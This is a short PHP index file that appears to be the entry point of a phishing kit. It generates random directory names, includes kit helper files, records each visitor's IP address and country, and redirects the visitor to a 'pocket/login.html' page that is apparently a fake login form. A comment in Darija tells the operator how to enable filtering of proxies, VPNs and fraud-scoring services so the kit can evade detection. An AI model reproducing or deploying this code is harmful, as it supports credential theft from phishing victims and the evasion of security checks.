<?php
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
//require 'ew/filter.php';// HENA ATHBA ILA BGHITI T7YED L ANTI PROXY W VPN W FRAUDSCOREN
include 'app/app.php';
include '0.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
echo "<meta http-equiv='refresh' content='0;url=pocket/login.html'>";
?>